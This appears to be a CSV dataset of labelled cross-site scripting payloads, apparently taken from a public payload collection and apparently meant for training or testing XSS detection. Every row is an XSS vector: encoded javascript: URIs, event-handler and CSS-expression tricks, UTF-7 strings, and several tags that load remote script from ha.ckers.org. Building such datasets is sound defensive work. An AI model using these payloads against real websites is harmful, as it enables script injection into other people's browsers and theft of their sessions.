payload,label,source
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss,payloads_all_the_things
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss,payloads_all_the_things
SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss,payloads_all_the_things
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss,payloads_all_the_things
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss,payloads_all_the_things
"<IMG SRC=""jav	ascript:alert('XSS');"">",xss,payloads_all_the_things
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss,payloads_all_the_things
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss,payloads_all_the_things
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss,payloads_all_the_things
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss,payloads_all_the_things
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,payloads_all_the_things
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,xss,payloads_all_the_things
"<IMG SRC=""javascript:alert('XSS')""",xss,payloads_all_the_things
<SCRIPT>a=/XSS/,xss,payloads_all_the_things
"\"";alert('XSS');//",xss,payloads_all_the_things
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss,payloads_all_the_things
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss,payloads_all_the_things
<BODY ONLOAD=alert('XSS')>,xss,payloads_all_the_things
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss,payloads_all_the_things
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss,payloads_all_the_things
"<BGSOUND SRC=""javascript:alert('XSS');"">",xss,payloads_all_the_things
"<BR SIZE=""&{alert('XSS')}"">",xss,payloads_all_the_things
"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",xss,payloads_all_the_things
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss,payloads_all_the_things
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss,payloads_all_the_things
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss,payloads_all_the_things
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss,payloads_all_the_things
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss,payloads_all_the_things
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss,payloads_all_the_things
"<IMG SRC=""mocha:[code]"">",xss,payloads_all_the_things
"<IMG SRC=""livescript:[code]"">",xss,payloads_all_the_things
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",xss,payloads_all_the_things
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",xss,payloads_all_the_things
"<META HTTP-EQUIV=""Link"" Content=""<javascript:alert('XSS')>; REL=stylesheet"">",xss,payloads_all_the_things
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",xss,payloads_all_the_things
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",xss,payloads_all_the_things
"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",xss,payloads_all_the_things
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss,payloads_all_the_things
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss,payloads_all_the_things
"<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",xss,payloads_all_the_things
"<DIV STYLE=""width: expression(alert('XSS'));"">",xss,payloads_all_the_things
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss,payloads_all_the_things
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss,payloads_all_the_things
"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss,payloads_all_the_things
"exp/*<XSS STYLE='no\xss:noxss(""*//*"");",xss,payloads_all_the_things
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss,payloads_all_the_things
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss,payloads_all_the_things
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss,payloads_all_the_things
"<BASE HREF=""javascript:alert('XSS');//"">",xss,payloads_all_the_things
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",xss,payloads_all_the_things
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,xss,payloads_all_the_things
"getURL(""javascript:alert('XSS')"")",xss,payloads_all_the_things
"a=""get"";",xss,payloads_all_the_things
"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=""javas<![CDATA[cript:alert('XSS');"">",xss,payloads_all_the_things
"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML>",xss,payloads_all_the_things
<HTML><BODY>,xss,payloads_all_the_things
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",xss,payloads_all_the_things
"<!--#exec cmd=""/bin/echo '<SCRIPT SRC'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss,payloads_all_the_things
<? echo('<SCR)';,xss,payloads_all_the_things
"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",xss,payloads_all_the_things
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss,payloads_all_the_things
"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,payloads_all_the_things
"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,payloads_all_the_things
"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,payloads_all_the_things
"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,payloads_all_the_things
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,payloads_all_the_things
%3Cimg/src=%3Dx+onload=alert(2)%3D,xss,payloads_all_the_things
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%72%69%70%74%3e,xss,payloads_all_the_things
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(0x0000EB)%3C/script%3E,xss,payloads_all_the_things
48e71%3balert(1)//503466e3,xss,payloads_all_the_things
';confirm('XSS')//1491b2as,xss,payloads_all_the_things
a29b1%3balert(888)//a62b7156d82,xss,payloads_all_the_things
<scr&#x9ipt>alert('XSS')</scr&#x9ipt>,xss,payloads_all_the_things
"""onmouseover%3dprompt(941634)",xss,payloads_all_the_things
%f6%22%20onmouseover%3dprompt(941634)%20,xss,payloads_all_the_things
""" onerror=alert()1 a=""",xss,payloads_all_the_things
style=xss:expression(alert(1)),xss,payloads_all_the_things
<input type=text value=“XSS”>,xss,payloads_all_the_things
A” autofocus onfocus=alert(“XSS”)//,xss,payloads_all_the_things
<input type=text value=”A” autofocus onfocus=alert(“XSS”)//”>,xss,payloads_all_the_things
"<a href=""javascript:alert(1)"">ssss</a>",xss,payloads_all_the_things
+ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-,xss,payloads_all_the_things
+ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-,xss,payloads_all_the_things
+ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-,xss,payloads_all_the_things
<%00script>alert(‘XSS’)<%00/script>,xss,payloads_all_the_things
<%script>alert(‘XSS’)<%/script>,xss,payloads_all_the_things
<%tag style=”xss:expression(alert(‘XSS’))”>,xss,payloads_all_the_things
"<%tag    onmouseover=""(alert('XSS'))""> is invalid. <%br />",xss,payloads_all_the_things
"</b style=""expr/**/ession(alert('vulnerable'))"">",xss,payloads_all_the_things
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss,payloads_all_the_things
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss,payloads_all_the_things
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss,payloads_all_the_things
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss,payloads_all_the_things
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,payloads_all_the_things
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss,payloads_all_the_things
<SCRIPT SRC=//ha.ckers.org/.j>,xss,payloads_all_the_things
<iframe src=http://ha.ckers.org/scriptlet.html <,xss,payloads_all_the_things
alert(a.source)</SCRIPT>,xss,payloads_all_the_things
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss,payloads_all_the_things
"<XSS STYLE=""behavior: url(xss.htc);"">",xss,payloads_all_the_things
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS",xss,payloads_all_the_things
¼script¾alert(¢XSS¢)¼/script¾,xss,payloads_all_the_things
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss,payloads_all_the_things
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss,payloads_all_the_things
"exp/*<A STYLE='no\xss:noxss(""*//*"");",xss,payloads_all_the_things
"xss:&#101;x&#x2F;*XSS*//*/*/pression(alert(""XSS""))'>",xss,payloads_all_the_things
<!--[if gte IE 4]>,xss,payloads_all_the_things
<![endif]-->,xss,payloads_all_the_things
"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>",xss,payloads_all_the_things
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",xss,payloads_all_the_things
"b=""URL(\"""";",xss,payloads_all_the_things
"c=""javascript:"";",xss,payloads_all_the_things
"d=""alert('XSS');\"")"";",xss,payloads_all_the_things
eval(a+b+c+d);,xss,payloads_all_the_things
<HTML xmlns:xss>,xss,payloads_all_the_things
"<?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc"">",xss,payloads_all_the_things
<xss:xss>XSS</xss:xss>,xss,payloads_all_the_things
</HTML>,xss,payloads_all_the_things
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>",xss,payloads_all_the_things
</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>,xss,payloads_all_the_things
"<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:alert('XSS')""&gt;</B></I></XML>",xss,payloads_all_the_things
"<SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",xss,payloads_all_the_things
"<XML SRC=""xsstest.xml"" ID=I></XML>",xss,payloads_all_the_things
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>,xss,payloads_all_the_things
"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">",xss,payloads_all_the_things
"<?import namespace=""t"" implementation=""#default#time2"">",xss,payloads_all_the_things
"<t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"">",xss,payloads_all_the_things
</BODY></HTML>,xss,payloads_all_the_things
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",xss,payloads_all_the_things
"echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",xss,payloads_all_the_things
"<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,payloads_all_the_things
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss,payloads_all_the_things
"<A HREF=""http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D"">XSS</A>",xss,payloads_all_the_things
"<A HREF=""javascript:document.location='http://www.google.com/'"">XSS</A>",xss,payloads_all_the_things
"<A HREF=""http://www.gohttp://www.google.com/ogle.com/"">XSS</A>",xss,payloads_all_the_things
%3C,xss,payloads_all_the_things
&lt,xss,payloads_all_the_things
&lt;,xss,payloads_all_the_things
&LT,xss,payloads_all_the_things
&LT;,xss,payloads_all_the_things
&#60,xss,payloads_all_the_things
&#060,xss,payloads_all_the_things
&#0060,xss,payloads_all_the_things
&#00060,xss,payloads_all_the_things
&#000060,xss,payloads_all_the_things
&#0000060,xss,payloads_all_the_things
&#60;,xss,payloads_all_the_things
&#060;,xss,payloads_all_the_things
&#0060;,xss,payloads_all_the_things
&#00060;,xss,payloads_all_the_things
&#000060;,xss,payloads_all_the_things
&#0000060;,xss,payloads_all_the_things
&#x3c,xss,payloads_all_the_things
&#x03c,xss,payloads_all_the_things
&#x003c,xss,payloads_all_the_things
&#x0003c,xss,payloads_all_the_things
&#x00003c,xss,payloads_all_the_things
&#x000003c,xss,payloads_all_the_things
&#x3c;,xss,payloads_all_the_things
&#x03c;,xss,payloads_all_the_things
&#x003c;,xss,payloads_all_the_things
&#x0003c;,xss,payloads_all_the_things
&#x00003c;,xss,payloads_all_the_things
&#x000003c;,xss,payloads_all_the_things
&#X3c,xss,payloads_all_the_things
&#X03c,xss,payloads_all_the_things
&#X003c,xss,payloads_all_the_things
&#X0003c,xss,payloads_all_the_things
&#X00003c,xss,payloads_all_the_things
&#X000003c,xss,payloads_all_the_things
&#X3c;,xss,payloads_all_the_things
&#X03c;,xss,payloads_all_the_things
&#X003c;,xss,payloads_all_the_things
&#X0003c;,xss,payloads_all_the_things
&#X00003c;,xss,payloads_all_the_things
&#X000003c;,xss,payloads_all_the_things
&#x3C,xss,payloads_all_the_things
&#x03C,xss,payloads_all_the_things
&#x003C,xss,payloads_all_the_things
&#x0003C,xss,payloads_all_the_things
&#x00003C,xss,payloads_all_the_things
&#x000003C,xss,payloads_all_the_things
&#x3C;,xss,payloads_all_the_things
&#x03C;,xss,payloads_all_the_things
&#x003C;,xss,payloads_all_the_things
&#x0003C;,xss,payloads_all_the_things
&#x00003C;,xss,payloads_all_the_things
&#x000003C;,xss,payloads_all_the_things
&#X3C,xss,payloads_all_the_things
&#X03C,xss,payloads_all_the_things
&#X003C,xss,payloads_all_the_things
&#X0003C,xss,payloads_all_the_things
&#X00003C,xss,payloads_all_the_things
&#X000003C,xss,payloads_all_the_things
&#X3C;,xss,payloads_all_the_things
&#X03C;,xss,payloads_all_the_things
&#X003C;,xss,payloads_all_the_things
&#X0003C;,xss,payloads_all_the_things
&#X00003C;,xss,payloads_all_the_things
&#X000003C;,xss,payloads_all_the_things
\x3c,xss,payloads_all_the_things
\x3C,xss,payloads_all_the_things
\u003c,xss,payloads_all_the_things
\u003C,xss,payloads_all_the_things
"<script\x20type=""text/javascript"">javascript:alert(1);</script>",xss,payloads_all_the_things
"<script\x3Etype=""text/javascript"">javascript:alert(1);</script>",xss,payloads_all_the_things
"<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss,payloads_all_the_things
"<script\x09type=""text/javascript"">javascript:alert(1);</script>",xss,payloads_all_the_things
"<script\x0Ctype=""text/javascript"">javascript:alert(1);</script>",xss,payloads_all_the_things
"<script\x2Ftype=""text/javascript"">javascript:alert(1);</script>",xss,payloads_all_the_things
"<script\x0Atype=""text/javascript"">javascript:alert(1);</script>",xss,payloads_all_the_things
"'`""><\x3Cscript>javascript:alert(1)</script>",xss,payloads_all_the_things
"'`""><\x00script>javascript:alert(1)</script>",xss,payloads_all_the_things
"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",xss,payloads_all_the_things
"<audio src=1 href=1 onerror=""javascript:alert(1)""></audio>",xss,payloads_all_the_things
"<video src=1 href=1 onerror=""javascript:alert(1)""></video>",xss,payloads_all_the_things
"<body src=1 href=1 onerror=""javascript:alert(1)""></body>",xss,payloads_all_the_things
"<image src=1 href=1 onerror=""javascript:alert(1)""></image>",xss,payloads_all_the_things
"<object src=1 href=1 onerror=""javascript:alert(1)""></object>",xss,payloads_all_the_things
"<script src=1 href=1 onerror=""javascript:alert(1)""></script>",xss,payloads_all_the_things
"<svg onResize svg onResize=""javascript:javascript:alert(1)""></svg onResize>",xss,payloads_all_the_things
"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1)""></title onPropertyChange>",xss,payloads_all_the_things
"<iframe onLoad iframe onLoad=""javascript:javascript:alert(1)""></iframe onLoad>",xss,payloads_all_the_things
"<body onMouseEnter body onMouseEnter=""javascript:javascript:alert(1)""></body onMouseEnter>",xss,payloads_all_the_things
"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",xss,payloads_all_the_things
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",xss,payloads_all_the_things
"<script onReadyStateChange script onReadyStateChange=""javascript:javascript:alert(1)""></script onReadyStateChange>",xss,payloads_all_the_things
"<html onMouseUp html onMouseUp=""javascript:javascript:alert(1)""></html onMouseUp>",xss,payloads_all_the_things
"<body onPropertyChange body onPropertyChange=""javascript:javascript:alert(1)""></body onPropertyChange>",xss,payloads_all_the_things
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",xss,payloads_all_the_things
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",xss,payloads_all_the_things
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss,payloads_all_the_things
"<body onUnload body onUnload=""javascript:javascript:alert(1)""></body onUnload>",xss,payloads_all_the_things
"<body onLoad body onLoad=""javascript:javascript:alert(1)""></body onLoad>",xss,payloads_all_the_things
"<bgsound onPropertyChange bgsound onPropertyChange=""javascript:javascript:alert(1)""></bgsound onPropertyChange>",xss,payloads_all_the_things
"<html onMouseLeave html onMouseLeave=""javascript:javascript:alert(1)""></html onMouseLeave>",xss,payloads_all_the_things
